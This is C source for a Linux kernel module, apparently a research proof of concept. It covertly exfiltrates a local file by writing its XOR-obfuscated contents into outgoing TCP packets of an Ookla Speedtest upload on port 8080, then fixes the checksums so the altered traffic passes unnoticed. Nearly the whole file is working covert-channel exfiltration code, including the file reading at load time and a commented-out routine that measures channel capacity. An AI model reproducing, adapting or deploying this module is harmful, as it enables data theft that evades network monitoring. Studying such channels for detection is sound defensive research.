/*
This LKM modifies TCP PSH/ACK packets over port 8080 to exfiltrate data from a client machine during a Speedtest.
This code should work with any Ookla Speedtest server using HTTP (e.g. http://speedtest.midco.net) or the Speedtest-CLI.
Tested on Ubuntu 24.04 with version 6.8 kernel and Ubuntu 26.04 with version 7.0 kernel.
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/inet.h>
#include <linux/string.h>
#include <linux/in.h>
#include <linux/net.h>
#include <linux/skbuff.h>
#include <net/tcp.h>
#include <net/checksum.h>
#include <linux/random.h>
#include <linux/jiffies.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/timekeeping.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Janessa Palmieri");
MODULE_DESCRIPTION("Kernel module to modify Speedtest packets.");

//const vars to modify; client.sh modifies these
#define TEST_FILE "/path/to/file.txt"
#define SOURCE_IP "192.168.X.X"

//const vars to skip OPTIONS and POST packets over port 8080 seen with HTTP Speedtest servers
#define SEARCH_STR_OPTIONS "OPTIONS"
#define SEARCH_LEN_OPTIONS 7

#define SEARCH_STR_POST "POST"
#define SEARCH_LEN_POST 4

//avoid file exceeding TCP payload size
#define MAX_FILE_SIZE 1400

//total number of bytes exfiled
static unsigned long total_exfiled_bytes = 0;

//netfilter hook options
static struct nf_hook_ops *nfho = NULL;

//file data read at module load time
static char *file_data = NULL;
static int file_data_len = 0;

//atomic variable to ensure file is only exfiltrated once per speedtest session
static atomic_t exfil_done = ATOMIC_INIT(0);

//function that demonstrates the exfiltration of a test file.
static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len) {
	char *stamped;				//pointer to buffer that will hold the timestamp, length, and XOR'd file data
	int max_data = payload_len - 6;		//6 header bytes: 4 timestamp + 2 length
	int send_len;				//number of bytes of file data we can fit in the TCP payload after the header
	int i;
	time64_t ts;				//64-bit timestamp
	u32 ts32;				//32-bit timestamp
	u8 ts_bytes[4];				//timestamp as 4 bytes to XOR with file data

	//if exfil_done was already 1, skip exfiltration; otherwise set it to 1 and proceed
	if (atomic_cmpxchg(&exfil_done, 0, 1) != 0)
		return NF_ACCEPT;

	//safety if we can't fit any file data in the TCP payload or if file data isn't available
	if (max_data <= 0 || file_data == NULL || file_data_len == 0)
		return NF_ACCEPT;

	//send either the entire file or the max amount of data that can fit in the TCP payload
	send_len = min(file_data_len, max_data);

	//allocate heap memory for the stamped buffer; use GFP_ATOMIC for atomic context
	stamped = kmalloc(6 + send_len, GFP_ATOMIC);
	if (!stamped)
		return NF_ACCEPT;

	//build stamped payload: [4 bytes ts][2 bytes len][xor'd file content]
	ts = ktime_get_real_seconds();		//get current Unix timestamp in seconds
	ts32 = (u32)ts;				//truncate to 32 bits

	//split 32-bit timestamp into 4 individual bytes, little-endian; this is the header and XOR key for receiver.sh
	ts_bytes[0] = ts32 & 0xFF;
	ts_bytes[1] = (ts32 >> 8) & 0xFF;
	ts_bytes[2] = (ts32 >> 16) & 0xFF;
	ts_bytes[3] = (ts32 >> 24) & 0xFF;

	//write 4-byte timestamp into the first 4 bytes of the stamped buffer
	memcpy(stamped, ts_bytes, 4);

	//write 2-byte length of file data into the next 2 bytes of the stamped buffer
	stamped[4] = (send_len >> 8) & 0xFF;
	stamped[5] = send_len & 0xFF;

	//XOR each byte of the file with one byte of the 4-byte timestamp, cycling through them
	for (i = 0; i < send_len; i++)
		stamped[6 + i] = file_data[i] ^ ts_bytes[i % 4];

	//write the stamped buffer into the TCP payload
	skb_store_bits(skb, offset, stamped, 6 + send_len);

	//free heap memory
	kfree(stamped);
	return NF_ACCEPT;
}

//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single speedtest.
static unsigned int max_bytes_exfiled(struct sk_buff *skb, int offset, int len) {
	char *buf;

	//allocate heap memory for random bytes; atomic context
	buf = kmalloc(len, GFP_ATOMIC);
	if (!buf)
		return NF_ACCEPT;

	//fill buffer with random bytes and write into TCP payload
	get_random_bytes(buf, len);
	skb_store_bits(skb, offset, buf, len);

	//free heap memory and update total exfiltrated bytes
	kfree(buf);
	total_exfiled_bytes += len;
	return NF_ACCEPT;
}

//hook function that filters on the PSH/ACK upload speed packets, calls PoC functions, and recalculates checksums.
static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
	struct iphdr *ip_header;
	struct tcphdr *tcp_header;

	int ip_hdr_len;				//IP header length
	int tcp_hdr_len;			//TCP header length
	int tcp_payloadoffset;			//start of TCP payload
	int tcp_payloadlen;			//TCP payload length
	int total_len;				//total length of packet
	unsigned char *payload_pointer;		//pointer to TCP payload

	//convert source IP to bytes
	__be32 source_ip;
	char ip_source[] = SOURCE_IP;
	__be32 client_ip = in_aton(ip_source);

	//check if packet is valid
	if (!skb)
		return NF_ACCEPT;

	//ensure linear data
	if (skb_linearize(skb) < 0)
		return -ENOMEM;

	//extract IP header
	ip_header = ip_hdr(skb);
	ip_hdr_len = ip_header->ihl * 4;

	//only process TCP packets
	if (ip_header->protocol != IPPROTO_TCP)
		return NF_ACCEPT;

	//extract TCP header
	tcp_header = tcp_hdr(skb);
	tcp_hdr_len = tcp_header->doff * 4;

	//extract source IP address
	source_ip = ip_header->saddr;

	//total packet length
	total_len = ntohs(ip_header->tot_len);

	//filter on PSH/ACK upload packets over port 8080 - may hit other TCP traffic matching this condition
	if (ntohs(tcp_header->dest) == 8080 &&
		source_ip == client_ip &&
		tcp_header->fin == 0 &&
		tcp_header->syn == 0 &&
		tcp_header->rst == 0 &&
		tcp_header->ack == 1 &&
		tcp_header->psh == 1 &&
		total_len > 1500) {

		//integer offset of TCP payload
		tcp_payloadoffset = ip_hdr_len + tcp_hdr_len;

		//grab pointer to start of TCP payload
		payload_pointer = (unsigned char*)tcp_header + tcp_hdr_len;

		//skip OPTIONS and POST packets
		if (memcmp(payload_pointer, SEARCH_STR_OPTIONS, SEARCH_LEN_OPTIONS) == 0 ||
			memcmp(payload_pointer, SEARCH_STR_POST, SEARCH_LEN_POST) == 0)
			return NF_ACCEPT;

		//TCP payload length = total packet - IP header - TCP header
		tcp_payloadlen = total_len - ip_hdr_len - tcp_hdr_len;

		//call function that demos exfil of a test file
		exfil_file(skb, tcp_payloadoffset, tcp_payloadlen);

		//call function that overwrites entire TCP payload with random bytes and calculates the max amount of bytes that can be exfiled in a single Speedtest
		//max_bytes_exfiled(skb, tcp_payloadoffset, tcp_payloadlen);

		//zero out checksum
		tcp_header->check = 0;

		//IPv4: calculate partial checksum over TCP data
		if (ip_header->version == 4) {
			tcp_header->check = tcp_v4_check(
				skb->len - ip_hdr_len,
				ip_header->saddr, ip_header->daddr,
				csum_partial(tcp_header, skb->len - ip_hdr_len, 0));
		}
		skb->ip_summed = CHECKSUM_NONE;

		//recalculate IP header checksum
		if (ip_header->version == 4) {
			ip_header->check = 0;
			ip_header->check = ip_fast_csum((unsigned char *)ip_header, ip_header->ihl);
		}
	}
	return NF_ACCEPT;
}

//at module load time
static int __init LKM_init(void)
{
	struct file *testfile;		//pointer to file struct for reading the test file
	loff_t pos = 0;			//read from start of file
	ssize_t bytes_read;		//number of bytes read from the file

	//allocate buffer and read file at load time (safe process context)
	file_data = kmalloc(MAX_FILE_SIZE, GFP_KERNEL);
	if (!file_data)
		return -ENOMEM;

	//open the file
	testfile = filp_open(TEST_FILE, O_RDONLY, 0);
	if (IS_ERR(testfile)) {
		pr_err("exfil: failed to open %s\n", TEST_FILE);
		kfree(file_data);
		file_data = NULL;
		return PTR_ERR(testfile);
	}

	//read then close the file
	bytes_read = kernel_read(testfile, file_data, MAX_FILE_SIZE - 1, &pos);
	filp_close(testfile, NULL);

	if (bytes_read < 0) {
		pr_err("exfil: failed to read %s\n", TEST_FILE);
		kfree(file_data);
		file_data = NULL;
		return bytes_read;
	}

	//null-terminate and store the length of the file data
	file_data[bytes_read] = '\0';
	file_data_len = bytes_read;

	//allocate and initialize netfilter hook options
	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);

	nfho->hook	= (nf_hookfn*)hook_func;	//hook function
	nfho->hooknum	= NF_INET_POST_ROUTING;		//outgoing packets
	nfho->pf	= PF_INET;			//IPv4
	nfho->priority	= NF_IP_PRI_FIRST;		//max hook priority

	//register netfilter hook
	nf_register_net_hook(&init_net, nfho);
	return 0;
}

//at module unload time
static void __exit LKM_exit(void)
{
	//unregister hook and free file data buffer
	nf_unregister_net_hook(&init_net, nfho);
	kfree(file_data);
//	pr_info("Total bytes exfiled: %lu bytes (%lu.%lu MB)\n", total_exfiled_bytes, total_exfiled_bytes / 1000000, (total_exfiled_bytes % 1000000) / 100000);
}

module_init(LKM_init);
module_exit(LKM_exit);
